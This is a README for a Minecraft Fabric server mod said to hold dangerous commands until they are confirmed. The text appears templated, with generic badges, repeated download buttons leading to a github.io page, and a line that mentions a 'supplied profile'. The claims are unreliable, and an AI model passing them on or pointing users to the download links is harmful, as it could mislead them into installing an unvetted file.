# CNM Protection v1.0.0 - Game Script Utility 2026

> **A server-side Minecraft Fabric mod for adding confirmation prompts to dangerous commands and managing command execution from players, operators, the console, RCON, command blocks, and data pack functions.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Fabric%20server-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millercalebboyk1534/cnm-protection-fabric-mod?style=flat-square)](https://github.com/millercalebboyk1534/cnm-protection-fabric-mod)

---

<p align="center">
  <a href="https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/">
    <img src="https://img.shields.io/badge/Download-CNM%20Protection%20Script-brightgreen?style=for-the-badge" alt="Download CNM Protection Script">
  </a>
</p>

> **[Download CNM Protection](https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/)**

---

[Download Latest Build](https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/)

---

## What CNM Protection Does

CNM Protection operates as an independent server-side mod for Minecraft Fabric. It checks commands against configured dangerous-command rules and pauses matching commands until an additional confirmation is provided. Commands can be intercepted regardless of whether they come from a player, operator, server console, RCON connection, command block, or data pack function.

Alongside confirmation handling, the mod can cancel outstanding requests and report their status. Once approved, a command is run again under the identity of the source that originally issued it. Entity selectors may be inspected automatically, and the server console records the source of intercepted commands. Configuration focuses on command matching rules and confirmation expiration.

---

## Capabilities

- Applies interception rules to dangerous commands from supported execution sources.
- Accepts command activity from players, operators, the console, RCON, command blocks, and data pack functions.
- Pauses matching commands until a second confirmation is supplied.
- Lets pending command requests be cancelled.
- Reports the current status of active confirmation requests.
- Re-executes confirmed commands with the original source identity.
- Automatically inspects entity selectors found in intercepted commands.
- Provides configurable matching rules and confirmation timeout behavior.
- Writes interception-source information to the server console.
- Runs as a standalone Fabric server mod and does not require Fabric API.

---

## Installation

1. Get the newest CNM Protection build from the [download page](https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/).
2. Check that the downloaded file is compatible with your Minecraft Fabric server setup.
3. Shut down the server before installing.
4. Copy the downloaded `.jar` into the server's `mods` folder.
5. Launch the server and inspect the console for interception messages and configuration guidance.
6. Configure the dangerous-command rules and timeout to suit your server's needs.

Before editing protection settings, back up the current server configuration. For safer validation, test the rules with a controlled account or in a test world before enabling them during normal operation.

---

## Configuration Areas

CNM Protection's settings cover the following behavior:

| Option | Purpose |
| --- | --- |
| Dangerous command rules | Determines which commands are held for a second confirmation. |
| Confirmation timeout | Sets the period during which an unconfirmed request remains active. |
| Command cancellation | Withdraws a pending request before it is executed. |
| Status checking | Shows information about applicable confirmation requests. |
| Entity selector analysis | Inspects selectors contained in intercepted commands. |
| Source logging | Identifies the origin of intercepted commands in the server console. |

The precise configuration structure and command syntax can differ between builds. Use the files and console messages supplied with the downloaded version as the reference for your installation.

---

## Compatibility and Requirements

- **Target platform:** Minecraft Fabric server
- **Runtime model:** Server-side
- **Fabric API:** Not required
- **Covered sources:** Players, operators, server console, RCON, command blocks, and data pack functions
- **Version note:** The supplied profile does not identify a specific Minecraft version or Fabric loader version. Check the metadata for the build you plan to install.
- **Operational limitation:** Only commands included by the configured rules receive protection. Commands not covered by those rules are not stated to require confirmation.

---

## Frequently Asked Questions

### What is the installation process?

Download the build, stop the Fabric server, place the mod `.jar` in the server's `mods` directory, and start the server again.

### Is Fabric API needed?

No. CNM Protection is intended to function as a standalone server mod without Fabric API.

### What command sources are supported?

The mod can intercept matching commands from players, operators, the server console, RCON, command blocks, and data pack functions. A command is intercepted when it matches the configured dangerous-command rules.

### Can I revoke a request before it runs?

Yes. Pending confirmation requests can be cancelled, and their status can also be checked.

### How is an approved command executed?

After confirmation, CNM Protection replays the command while preserving the identity of the source that originally issued it.

### Can the protected command list be customized?

Yes. The dangerous-command rules can be changed. Apply the settings appropriate to the installed build, then restart or reload as directed by that build.

### What controls the confirmation period?

The confirmation timeout is configurable. Consult the installed build's configuration or its console instructions for the accepted value and format.

### Are entity selectors inspected?

Yes. The mod can automatically analyze entity selectors used in intercepted commands.

### Where are interception events recorded?

The server console logs the source associated with intercepted commands.

### What should I do when upgrading?

Download the newer build, stop the server, replace the current mod file, and check for configuration changes before restarting. Test the updated behavior before putting the server back into regular use.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
